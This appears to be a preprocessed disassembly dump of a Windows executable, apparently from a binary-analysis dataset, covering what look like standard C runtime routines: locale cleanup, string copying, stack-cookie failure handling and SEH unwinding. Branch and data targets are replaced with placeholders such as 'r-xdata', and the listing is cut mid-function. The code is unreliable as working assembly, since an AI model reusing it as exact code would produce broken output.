call sub_4152db
push [ esi + 0x18 ]
call sub_4152db
push [ esi ]
call sub_4152db
push [ esi + 0x20 ]
call sub_4152db
push [ esi + 0x24 ]
call sub_4152db
push [ esi + 0x28 ]
call sub_4152db
push [ esi + 0x2c ]
call sub_4152db
push [ esi + 0x30 ]
call sub_4152db
push [ esi + 0x34 ]
call sub_4152db
push [ esi + 0x1c ]
call sub_4152db
push [ esi + 0x38 ]
call sub_4152db
push [ esi + 0x3c ]
call sub_4152db
add esp 0x40
push [ esi + 0x40 ]
call sub_4152db
push [ esi + 0x44 ]
call sub_4152db
push [ esi + 0x48 ]
call sub_4152db
push [ esi + 0x4c ]
call sub_4152db
push [ esi + 0x50 ]
call sub_4152db
push [ esi + 0x54 ]
call sub_4152db
push [ esi + 0x58 ]
call sub_4152db
push [ esi + 0x5c ]
call sub_4152db
push [ esi + 0x60 ]
call sub_4152db
push [ esi + 0x64 ]
call sub_4152db
push [ esi + 0x68 ]
call sub_4152db
push [ esi + 0x6c ]
call sub_4152db
push [ esi + 0x70 ]
call sub_4152db
push [ esi + 0x74 ]
call sub_4152db
push [ esi + 0x78 ]
call sub_4152db
push [ esi + 0x7c ]
call sub_4152db
add esp 0x40
push [ esi + 0x80 ]
call sub_4152db
push [ esi + 0x84 ]
call sub_4152db
push [ esi + 0x88 ]
call sub_4152db
push [ esi + 0x8c ]
call sub_4152db
push [ esi + 0x90 ]
call sub_4152db
push [ esi + 0x94 ]
call sub_4152db
push [ esi + 0x98 ]
call sub_4152db
push [ esi + 0x9c ]
call sub_4152db
push [ esi + 0xa0 ]
call sub_4152db
push [ esi + 0xa4 ]
call sub_4152db
push [ esi + 0xa8 ]
call sub_4152db
push [ esi + 0xbc ]
call sub_4152db
push [ esi + 0xc0 ]
call sub_4152db
push [ esi + 0xc4 ]
call sub_4152db
push [ esi + 0xc8 ]
call sub_4152db
push [ esi + 0xcc ]
call sub_4152db
add esp 0x40
push [ esi + 0xd0 ]
call sub_4152db
push [ esi + 0xb8 ]
call sub_4152db
push [ esi + 0xd8 ]
call sub_4152db
push [ esi + 0xdc ]
call sub_4152db
push [ esi + 0xe0 ]
call sub_4152db
push [ esi + 0xe4 ]
call sub_4152db
push [ esi + 0xe8 ]
call sub_4152db
push [ esi + 0xec ]
call sub_4152db
push [ esi + 0xd4 ]
call sub_4152db
push [ esi + 0xf0 ]
call sub_4152db
push [ esi + 0xf4 ]
call sub_4152db
push [ esi + 0xf8 ]
call sub_4152db
push [ esi + 0xfc ]
call sub_4152db
push [ esi + 0x100 ]
call sub_4152db
push [ esi + 0x104 ]
call sub_4152db
push [ esi + 0x108 ]
call sub_4152db
add esp 0x40
push [ esi + 0x10c ]
call sub_4152db
push [ esi + 0x110 ]
call sub_4152db
push [ esi + 0x114 ]
call sub_4152db
push [ esi + 0x118 ]
call sub_4152db
push [ esi + 0x11c ]
call sub_4152db
push [ esi + 0x120 ]
call sub_4152db
push [ esi + 0x124 ]
call sub_4152db
push [ esi + 0x128 ]
call sub_4152db
push [ esi + 0x12c ]
call sub_4152db
push [ esi + 0x130 ]
call sub_4152db
push [ esi + 0x134 ]
call sub_4152db
push [ esi + 0x138 ]
call sub_4152db
push [ esi + 0x13c ]
call sub_4152db
push [ esi + 0x140 ]
call sub_4152db
push [ esi + 0x144 ]
call sub_4152db
push [ esi + 0x148 ]
call sub_4152db
add esp 0x40
push [ esi + 0x14c ]
call sub_4152db
push [ esi + 0x150 ]
call sub_4152db
push [ esi + 0x154 ]
call sub_4152db
push [ esi + 0x158 ]
call sub_4152db
push [ esi + 0x15c ]
call sub_4152db
push [ esi + 0x160 ]
call sub_4152db
add esp 0x18
sub_41878d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x8 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x30 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov esi [ esi + 0x34 ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
push esi
call sub_4152db
pop ecx
sub_4187f6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x18 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x20 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x24 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x38 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x3c ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x44 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov eax [ esi + 0x48 ]
cmp eax [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
mov esi [ esi + 0x4c ]
cmp esi [ rw-data ]
je r-xdata
push eax
call sub_4152db
pop ecx
push esi
call sub_4152db
pop ecx
sub_4188f4
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_418914
call sub_417bf1
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_417bfe
pop ecx
push 0x3
call sub_4157d7
int3
push 0x1
push 0x40000015
push 0x3
call sub_416bc7
add esp 0xc
sub_41894f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_41643c
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_417f3c
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_418abb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_416d42
mov eax esi
sub_418b30
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_416d42
mov eax esi
jmp r-xdata
sub_418bfd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_418c18
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_416d94
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_416d94
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_416d42
mov eax esi
sub_418c7b
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_416d94
mov [ eax ] 0x16
call sub_416d42
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_418cba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_418d2e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_418947
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_418947
pop ecx
sub_418e40
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418e60
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_417f3c
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_418ea5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_418ea5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_418e60
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_418f55
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_418f74
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_418f4c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_418f55
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_418fb0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_419050
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_41907b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_4135f1
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_419174
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_4183d6
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_419140
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_419174
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4135f1
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4191b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_419200
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_419240
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_4135f1
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_416d94
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_419174
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_41907b
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_4182a9
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_419355
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_419240
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_419390
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_419400
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_4194a0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_419508
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_419541
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_419595
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41aff2
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4195cb
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_417f3c
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_41aff2
add esp 0x20
pop esi
pop ebp
retn
sub_4195fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_4196d5
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_4165ec
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
